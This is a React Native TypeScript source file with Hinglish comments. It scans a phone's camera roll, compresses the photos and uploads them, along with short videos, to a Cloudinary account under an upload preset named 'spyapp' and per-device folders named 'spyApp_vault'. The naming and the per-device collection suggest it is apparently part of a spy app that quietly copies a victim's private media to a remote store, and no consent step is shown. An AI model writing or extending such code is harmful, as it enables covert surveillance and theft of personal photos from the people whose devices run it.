import { CameraRoll } from '@react-native-camera-roll/camera-roll';
import ImageResizer from '@bam.tech/react-native-image-resizer';
import axios from 'axios';

const CLOUD_NAME = 't1jlphfu';
const UPLOAD_PRESET = 'spyapp'; // ← sypapp se spyapp kiya — dashboard mein check karo exact naam
const CLOUDINARY_URL = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/upload`;

const globalUploadedFileIds = new Set<string>();

export interface MediaItem {
  url: string;
  fileId: string;
  mediaType: string;
}

export const scanAndUploadGallery = async (
  deviceId: string,
  sessionCache?: Set<string>,
): Promise<MediaItem[]> => {

  // ── STEP 1: CameraRoll se photos fetch karo ──────────────────────────────
  let photos: any;
  try {
    photos = await CameraRoll.getPhotos({
      first: 20,
      assetType: 'All',
      include: ['fileSize', 'filename', 'playableDuration'],
    });
    console.log(`[Gallery] STEP1: CameraRoll returned ${photos.edges.length} items`);
  } catch (err: any) {
    console.error('[Gallery] STEP1 FAILED - CameraRoll error:', err?.message || err);
    return [];
  }

  if (photos.edges.length === 0) {
    console.warn('[Gallery] STEP1: Gallery is empty or permission denied');
    return [];
  }

  const uploadedItems: MediaItem[] = [];
  const targetFolder = `spyApp_vault/${deviceId}`;

  for (let idx = 0; idx < photos.edges.length; idx++) {
    const node = photos.edges[idx].node as any;
    const fileUri = node.image.uri;
    const isVideo = node.type && node.type.startsWith('video');
    const fileId = fileUri; // URI as unique ID

    console.log(`[Gallery] Item ${idx + 1}: type=${node.type} uri=${fileUri?.slice(-30)}`);

    // ── STEP 2: Duplicate check ─────────────────────────────────────────────
    if (globalUploadedFileIds.has(fileId) || (sessionCache && sessionCache.has(fileId))) {
      console.log(`[Gallery] Item ${idx + 1}: SKIP (already uploaded)`);
      continue;
    }

    // ── STEP 3: Video duration check ────────────────────────────────────────
    if (isVideo) {
      const duration = node.playableDuration || node.duration || 0;
      if (duration > 60) {
        console.log(`[Gallery] Item ${idx + 1}: SKIP video too long (${Math.round(duration)}s)`);
        continue;
      }
      console.log(`[Gallery] Item ${idx + 1}: Video OK duration=${duration}s`);
    }

    // ── STEP 4: Image compression ────────────────────────────────────────────
    let processedUri = fileUri;
    if (!isVideo) {
      try {
        const resized = await ImageResizer.createResizedImage(
          fileUri, 1280, 1280, 'JPEG', 80, 0, undefined,
        );
        processedUri = resized.uri;
        console.log(`[Gallery] Item ${idx + 1}: Compressed OK`);
      } catch (err: any) {
        console.warn(`[Gallery] Item ${idx + 1}: Compression FAILED (using original):`, err?.message);
        processedUri = fileUri; // fallback to original
      }
    }

    // ── STEP 5: Cloudinary upload ────────────────────────────────────────────
    try {
      console.log(`[Gallery] Item ${idx + 1}: Uploading to Cloudinary...`);

      const formData = new FormData();
      formData.append('file', {
        uri: processedUri,
        type: isVideo ? 'video/mp4' : 'image/jpeg',
        name: `upload_${Date.now()}_${idx}.${isVideo ? 'mp4' : 'jpg'}`,
      } as any);
      formData.append('upload_preset', UPLOAD_PRESET);
      formData.append('folder', targetFolder);

      const res = await axios.post(CLOUDINARY_URL, formData, {
        headers: { 'Content-Type': 'multipart/form-data' },
        timeout: 60000,
      });

      if (res.data?.secure_url) {
        console.log(`[Gallery] Item ${idx + 1}: Upload SUCCESS -> ${res.data.secure_url.slice(-40)}`);
        uploadedItems.push({ url: res.data.secure_url, fileId, mediaType: isVideo ? 'video' : 'image' });
        globalUploadedFileIds.add(fileId);
        if (sessionCache) sessionCache.add(fileId);
      } else {
        console.warn(`[Gallery] Item ${idx + 1}: Upload returned no URL. Response:`, JSON.stringify(res.data));
      }
    } catch (uploadErr: any) {
      const status = uploadErr?.response?.status;
      const errDetail = uploadErr?.response?.data?.error?.message || uploadErr?.message;
      console.error(`[Gallery] Item ${idx + 1}: Upload FAILED status=${status} error=${errDetail}`);

      if (status === 400 || status === 409) {
        globalUploadedFileIds.add(fileId);
        if (sessionCache) sessionCache.add(fileId);
      }
    }
  }

  console.log(`[Gallery] DONE: ${uploadedItems.length}/${photos.edges.length} uploaded`);
  return uploadedItems;
};